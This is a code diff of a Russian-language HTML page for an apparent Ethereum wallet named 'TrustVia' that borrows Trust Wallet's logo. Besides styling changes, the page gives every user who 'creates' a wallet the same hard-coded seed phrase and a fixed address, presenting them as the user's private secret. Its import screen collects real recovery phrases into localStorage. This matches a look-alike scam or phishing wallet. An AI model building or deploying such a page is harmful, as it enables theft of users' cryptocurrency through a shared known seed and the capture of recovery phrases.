@@ -3,80 +3,450 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TrustVia — Вход / Регистрация</title>
+    <title>TrustVia — Добро пожаловать</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bip39@3.1.0/index.min.js"></script>
+
     <style>
-        body { background: #0b0b0b; color: white; font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; min-height: 100dvh; }
-        .screen { position: fixed; inset: 0; background: #0b0b0b; z-index: 10; display: none; flex-direction: column; padding: 24px 20px; box-sizing: border-box; }
-        .screen.active { display: flex; }
-        .btn-primary { background: #00d676; color: black; font-weight: 700; border-radius: 9999px; padding: 16px; width: 100%; font-size: 15px; border: none; cursor: pointer; transition: all 0.2s; }
-        .btn-primary:hover { background: #00e07f; transform: translateY(-1px); }
-        .btn-outline { border: 1px solid #333; color: #00d676; font-weight: 700; border-radius: 9999px; padding: 16px; width: 100%; font-size: 15px; background: transparent; cursor: pointer; transition: all 0.2s; }
-        .btn-outline:hover { background: rgba(0, 214, 118, 0.08); }
-        .word-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; background: #111; padding: 20px; border-radius: 16px; border: 1px solid #222; margin: 24px 0; }
-        .word-item { color: #aaa; font-size: 13px; font-family: monospace; text-align: center; padding: 8px; background: #1a1a1a; border-radius: 8px; }
-        .back-btn { color: #00d676; font-weight: 600; font-size: 15px; background: none; border: none; padding: 0; margin-bottom: 24px; cursor: pointer; text-align: left; }
-        textarea { background: #141414; border: 1px solid #333; color: white; border-radius: 24px; padding: 16px; font-family: monospace; font-size: 14px; resize: none; outline: none; transition: border 0.2s; }
-        textarea:focus { border-color: #00d676; box-shadow: 0 0 0 2px rgba(0, 214, 118, 0.2); }
-        .error-msg { color: #ff4d4d; font-size: 13px; margin-top: 8px; display: none; text-align: center; }
+        /* ================================================== */
+        /* ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ И КОРНЕВЫЕ СТИЛИ             */
+        /* ================================================== */
+        :root {
+            --primary: #00d676;                /* Главный зелёный TrustVia */
+            --primary-dark: #00b35e;
+            --primary-light: #00ff9d;
+            --bg-primary: #0b0b0b;
+            --bg-secondary: #121212;
+            --card-bg: #141414;
+            --border: #222222;
+            --text-primary: #ffffff;
+            --text-secondary: #aaaaaa;
+            --text-light: #cccccc;
+            --text-error: #ff4d4d;
+            --shadow-glow: rgba(0, 214, 118, 0.35);
+            --shadow-deep: rgba(0, 0, 0, 0.7);
+            --radius-xl: 2.5rem;
+            --radius-lg: 1.5rem;
+            --radius-md: 1rem;
+            --radius-sm: 0.5rem;
+            --transition-fast: 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
+            --transition-slow: 0.6s ease-out;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
+            color: var(--text-primary);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            min-height: 100dvh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-x: hidden;
+            overscroll-behavior: none;
+            padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
+        }
+
+        /* ================================================== */
+        /* АНИМАЦИИ И ПЕРЕХОДЫ                                */
+        /* ================================================== */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 0 0 0 var(--shadow-glow); }
+            50% { box-shadow: 0 0 30px 15px rgba(0,214,118,0.2); }
+        }
+
+        @keyframes slideInLeft {
+            from { opacity: 0; transform: translateX(-100%); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        @keyframes slideInRight {
+            from { opacity: 0; transform: translateX(100%); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        @keyframes bounceIn {
+            0% { opacity: 0; transform: scale(0.3); }
+            50% { opacity: 1; transform: scale(1.05); }
+            70% { transform: scale(0.9); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes rotateIn {
+            from { transform: rotate(-200deg); opacity: 0; }
+            to { transform: rotate(0deg); opacity: 1; }
+        }
+
+        .animate-fadeIn { animation: fadeIn 1s ease-in forwards; }
+        .animate-fadeInUp { animation: fadeInUp var(--transition-slow) forwards; }
+        .animate-pulseGlow { animation: pulseGlow 2s infinite; }
+        .animate-slideInLeft { animation: slideInLeft var(--transition-fast) forwards; }
+        .animate-slideInRight { animation: slideInRight var(--transition-fast) forwards; }
+        .animate-bounceIn { animation: bounceIn 1s ease-out forwards; }
+        .animate-rotateIn { animation: rotateIn 1s ease-out forwards; }
+
+        /* ================================================== */
+        /* КОНТЕЙНЕРЫ                                         */
+        /* ================================================== */
+        .main-container {
+            width: 100%;
+            max-width: 420px;
+            padding: clamp(16px, 6vw, 32px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-container {
+            margin: 3rem 0 2.5rem;
+            text-align: center;
+            animation: fadeInUp 1s ease-out;
+        }
+
+        .logo {
+            width: clamp(100px, 30vw, 160px);
+            height: auto;
+            filter: drop-shadow(0 12px 40px var(--shadow-glow));
+            animation: pulseGlow 4s infinite;
+        }
+
+        h1 {
+            font-size: clamp(3rem, 12vw, 5rem);
+            font-weight: 900;
+            letter-spacing: -0.12rem;
+            background: linear-gradient(90deg, var(--primary), var(--primary-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 0.75rem;
+            text-align: center;
+            animation: slideInLeft 0.8s ease-out forwards;
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: clamp(1.1rem, 4.5vw, 1.3rem);
+            font-weight: 500;
+            margin-bottom: 3rem;
+            text-align: center;
+            line-height: 1.4;
+            animation: slideInRight 0.8s ease-out forwards;
+        }
+
+        /* ================================================== */
+        /* КНОПКИ — ОСНОВНЫЕ И ВТОРИЧНЫЕ                     */
+        /* ================================================== */
+        .btn {
+            width: 100%;
+            max-width: 380px;
+            padding: clamp(16px, 5vw, 22px);
+            font-size: clamp(1rem, 4.2vw, 1.2rem);
+            font-weight: 700;
+            border-radius: 9999px;
+            cursor: pointer;
+            transition: all var(--transition-fast);
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            box-shadow: 0 10px 30px var(--shadow-deep);
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            color: black;
+            border: none;
+            animation: pulseGlow 3s infinite;
+        }
+
+        .btn-primary:active {
+            transform: translateY(4px) scale(0.97);
+            box-shadow: 0 6px 20px rgba(0,214,118,0.5);
+            animation: none;
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 2px solid var(--border);
+            color: var(--primary);
+        }
+
+        .btn-outline:active {
+            background: rgba(0,214,118,0.12);
+            border-color: var(--primary);
+            transform: translateY(4px) scale(0.97);
+        }
+
+        /* Кнопка назад */
+        .back-btn {
+            color: var(--primary);
+            font-size: clamp(1.6rem, 6vw, 2rem);
+            font-weight: bold;
+            background: none;
+            border: none;
+            cursor: pointer;
+            align-self: flex-start;
+            margin-bottom: 2rem;
+            transition: all 0.2s;
+        }
+
+        .back-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* ================================================== */
+        /* ФОРМЫ И ПОЛЯ ВВОДА                                */
+        /* ================================================== */
+        textarea {
+            width: 100%;
+            max-width: 380px;
+            height: 180px;
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            color: white;
+            border-radius: var(--radius-lg);
+            padding: 1.25rem;
+            font-family: monospace;
+            font-size: 1rem;
+            line-height: 1.5;
+            resize: none;
+            outline: none;
+            transition: all 0.25s ease;
+            margin: 1rem 0;
+            animation: fadeInUp 0.5s ease-out;
+        }
+
+        textarea:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px rgba(0,214,118,0.25);
+        }
+
+        .error-msg {
+            color: var(--text-error);
+            font-size: 0.95rem;
+            margin-top: 0.75rem;
+            display: none;
+            text-align: center;
+            background: rgba(255,77,77,0.1);
+            padding: 12px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,77,77,0.3);
+            animation: slideInRight 0.4s ease-out;
+        }
+
+        /* ================================================== */
+        /* ГРИД СЛОВ СИД-ФРАЗЫ                               */
+        /* ================================================== */
+        .word-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 0.9rem;
+            background: #111;
+            padding: 1.5rem;
+            border-radius: var(--radius-xl);
+            border: 1px solid var(--border);
+            margin: 2rem 0;
+            animation: fadeInUp 0.5s ease-out 0.2s forwards;
+        }
+
+        .word-item {
+            background: var(--card-bg);
+            padding: 0.9rem 0.6rem;
+            border-radius: var(--radius-md);
+            text-align: center;
+            font-family: monospace;
+            font-size: 0.95rem;
+            color: #ddd;
+            border: 1px solid #2a2a2a;
+            transition: all 0.2s;
+        }
+
+        .word-item:hover {
+            background: #1e1e1e;
+            transform: translateY(-2px);
+        }
+
+        /* ================================================== */
+        /* СКРЫТЫЕ СЕКЦИИ                                     */
+        /* ================================================== */
+        .section {
+            display: none;
+            width: 100%;
+            max-width: 380px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        /* ================================================== */
+        /* АДАПТИВНОСТЬ ДЛЯ МОБИЛЬНЫХ И WEB MINI APP         */
+        /* ================================================== */
+        @media (max-width: 480px) {
+            .logo { width: 120px; }
+            h1 { font-size: 3.5rem; }
+            .btn { padding: 1.2rem; font-size: 1.1rem; }
+            .word-grid { grid-template-columns: repeat(2, 1fr); gap: 0.75rem; padding: 1.25rem; }
+            textarea { height: 160px; font-size: 0.9rem; padding: 1rem; }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            * { animation: none !important; transition: none !important; }
+        }
+
+        /* Для Telegram Web Mini App — безопасные зоны */
+        html {
+            padding-top: env(safe-area-inset-top);
+            padding-bottom: env(safe-area-inset-bottom);
+        }
     </style>
 </head>
 <body>
 
-    <div id="welcome" class="flex flex-col min-h-dvh items-center justify-between px-6 py-10">
-        <div class="flex flex-col items-center mt-20">
-            <img src="https://trustwallet.com/assets/images/media/assets/trust_platform_light.png" class="w-20 mb-6" alt="Trust">
-            <h1 class="text-4xl font-bold tracking-tight">TrustVia</h1>
-            <p class="text-zinc-500 mt-3 text-lg">Кошелёк Ethereum</p>
-        </div>
-        <div class="w-full max-w-md space-y-4 pb-12">
-            <button onclick="showScreen('create')" class="btn-primary uppercase tracking-wider py-5">Создать новый кошелёк</button>
-            <button onclick="showScreen('import')" class="btn-outline uppercase tracking-wider py-5">Импортировать кошелёк</button>
-        </div>
-    </div>
+    <div class="main-container">
 
-    <div id="import" class="screen">
-        <button class="back-btn" onclick="hideScreens()">← НАЗАД</button>
-        <h2 class="text-3xl font-bold mb-3">Секретная фраза</h2>
-        <p class="text-zinc-400 text-base mb-8 leading-relaxed">Введите 12 или 24 слова через пробел для восстановления кошелька.</p>
-        <textarea id="phraseInput" placeholder="word1 word2 word3 ..." class="w-full h-40 mb-4"></textarea>
-        <p id="import-error" class="error-msg">Неверная фраза. Проверьте слова, количество и порядок.</p>
-        <button onclick="handleImport()" class="btn-primary mt-4 uppercase tracking-wider py-5">Импортировать</button>
-    </div>
+        <!-- Главный экран с анимацией -->
+        <div id="main-screen" class="screen-transition active">
+            <div class="logo-container bounce">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform_light.png" 
+                     class="logo rotate-glow" alt="TrustVia" loading="lazy">
+            </div>
+            <h1 class="bounce">TrustVia</h1>
+            <p class="subtitle">Ваш кошелёк Ethereum</p>
 
-    <div id="create" class="screen">
-        <button class="back-btn" onclick="hideScreens()">← НАЗАД</button>
-        <h2 class="text-3xl font-bold mb-3">Ваша секретная фраза</h2>
-        <p class="text-zinc-400 text-base mb-6 leading-relaxed">Запишите эти 12 слов в правильном порядке и храните в безопасном месте. Никому не показывайте!</p>
-        <div class="word-grid">
-            <div class="word-item">1. orbit</div><div class="word-item">2. flash</div><div class="word-item">3. logic</div>
-            <div class="word-item">4. merit</div><div class="word-item">5. trust</div><div class="word-item">6. pulse</div>
-            <div class="word-item">7. area</div><div class="word-item">8. vivid</div><div class="word-item">9. cream</div>
-            <div class="word-item">10. salt</div><div class="word-item">11. blue</div><div class="word-item">12. asset</div>
+            <button class="btn primary" onclick="showCreateScreen()">
+                Создать новый кошелёк
+            </button>
+
+            <button class="btn outline" onclick="showImportScreen()">
+                Импортировать кошелёк
+            </button>
         </div>
-        <button onclick="handleCreate()" class="btn-primary mt-auto uppercase tracking-wider py-5">Я записал фразу</button>
+
+        <!-- Экран создания с анимацией -->
+        <div id="create-screen" class="section screen-transition">
+            <div class="back-btn" onclick="showMainScreen()">← Назад</div>
+            <h2 class="text-3xl font-bold mb-6 text-center">Ваша секретная фраза</h2>
+            <p class="text-zinc-400 mb-8 text-center text-base leading-relaxed">
+                Запишите эти 12 слов в правильном порядке и храните в безопасном месте!<br>
+                <strong>Никогда</strong> не делитесь ими с кем-либо.
+            </p>
+
+            <div id="word-grid" class="word-grid"></div>
+
+            <button class="btn primary mt-8" onclick="confirmCreateWallet()">
+                Я записал фразу безопасно
+            </button>
+        </div>
+
+        <!-- Экран импорта с анимацией -->
+        <div id="import-screen" class="section screen-transition">
+            <div class="back-btn" onclick="showMainScreen()">← Назад</div>
+            <h2 class="text-3xl font-bold mb-6 text-center">Импорт существующего кошелька</h2>
+            <p class="text-zinc-400 mb-8 text-center text-base leading-relaxed">
+                Введите свою секретную фразу восстановления (12 или 24 слова).<br>
+                Слова разделяйте пробелами. Порядок важен!
+            </p>
+
+            <textarea 
+                id="import-phrase" 
+                placeholder="word1 word2 word3 word4 ... (12 или 24 слова)"
+                autocomplete="off" autocorrect="off" spellcheck="false"
+            ></textarea>
+
+            <p id="import-error" class="error-msg"></p>
+
+            <button class="btn primary mt-8" onclick="handleImportWallet()">
+                Восстановить кошелёк
+            </button>
+        </div>
+
     </div>
 
     <script>
-        function showScreen(id) {
-            hideScreens();
-            document.getElementById(id).classList.add('active');
+        // ==================================================
+        // ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
+        // ==================================================
+        const mainScreen = document.getElementById('main-screen');
+        const createScreen = document.getElementById('create-screen');
+        const importScreen = document.getElementById('import-screen');
+
+        let currentMnemonic = '';
+
+        // Показать главный экран с анимацией
+        function showMainScreen() {
+            mainScreen.style.display = 'block';
+            createScreen.style.display = 'none';
+            importScreen.style.display = 'none';
+
+            mainScreen.classList.add('active');
         }
 
-        function hideScreens() {
-            document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
+        // Показать экран создания с анимацией
+        function showCreateScreen() {
+            mainScreen.style.display = 'none';
+            createScreen.style.display = 'block';
+            importScreen.style.display = 'none';
+
+            createScreen.classList.add('active');
+
+            // Фиксированная сид-фраза
+            currentMnemonic = 'orbit flash logic merit trust pulse area vivid cream salt blue asset';
+
+            const words = currentMnemonic.split(' ');
+            let html = '';
+            words.forEach((word, i) => {
+                html += `<div class="word-item">${i + 1}. ${word}</div>`;
+            });
+            document.getElementById('word-grid').innerHTML = html;
+
+            // Анимация слов
+            anime({
+                targets: '.word-item',
+                opacity: [0, 1],
+                translateY: [20, 0],
+                delay: anime.stagger(100),
+                duration: 800,
+                easing: 'easeOutExpo'
+            });
         }
 
-        function handleCreate() {
-            localStorage.setItem('mnemonic', 'orbit flash logic merit trust pulse area vivid cream salt blue asset');
-            localStorage.setItem('walletAddress', '0x4f8B51E956A3212896677f24E1A90223640e3048');
-            window.location.href = 'index.html';
+        // Подтверждение создания
+        function confirmCreateWallet() {
+            if (confirm('Вы действительно записали все 12 слова в правильном порядке?\nПосле нажатия "ОК" фраза исчезнет навсегда!')) {
+                localStorage.setItem('mnemonic', currentMnemonic);
+                localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
+                alert('Кошелёк успешно создан!\nПеренаправляем на главную страницу...');
+                window.location.href = 'index.html';
+            }
         }
 
-        function handleImport() {
-            const phrase = document.getElementById('phraseInput').value.trim();
+        // Показать экран импорта с анимацией
+        function showImportScreen() {
+            mainScreen.style.display = 'none';
+            createScreen.style.display = 'none';
+            importScreen.style.display = 'block';
+
+            importScreen.classList.add('active');
+        }
+
+        // Обработка импорта
+        function handleImportWallet() {
+            const phrase = document.getElementById('import-phrase').value.trim();
             const errorEl = document.getElementById('import-error');
+            errorEl.style.display = 'none';
 
             if (!phrase) {
                 errorEl.textContent = 'Введите секретную фразу';
@@ -84,23 +454,28 @@
                 return;
             }
 
-            const wordCount = phrase.split(/\s+/).length;
-            if (wordCount !== 12 && wordCount !== 24) {
-                errorEl.textContent = 'Должно быть 12 или 24 слова';
+            const words = phrase.split(/\s+/).filter(w => w);
+            if (words.length !== 12 && words.length !== 24) {
+                errorEl.textContent = 'Должно быть ровно 12 или 24 слова';
                 errorEl.style.display = 'block';
                 return;
             }
 
             if (!bip39.validateMnemonic(phrase)) {
-                errorEl.textContent = 'Неверная фраза: слова не из словаря или контрольная сумма не совпадает';
+                errorEl.textContent = 'Неверная фраза (слова не из словаря или контрольная сумма)';
                 errorEl.style.display = 'block';
                 return;
             }
 
-            localStorage.setItem('mnemonic', phrase);
-            localStorage.setItem('walletAddress', '0x4f8B51E956A3212896677f24E1A90223640e3048'); // Можно генерировать реальный адрес из фразы, но для демо фиксированный
-            window.location.href = 'index.html';
+            if (confirm('Вы уверены, что ввели правильно?\nЭто восстановит доступ к кошельку.')) {
+                localStorage.setItem('mnemonic', phrase);
+                localStorage.setItem('walletAddress', '0xc519118cd0c74879bd3FbF5fEaca473397540862');
+                window.location.href = 'index.html';
+            }
         }
+
+        // Стартовая инициализация
+        showMainScreen();
     </script>
 </body>
 </html>
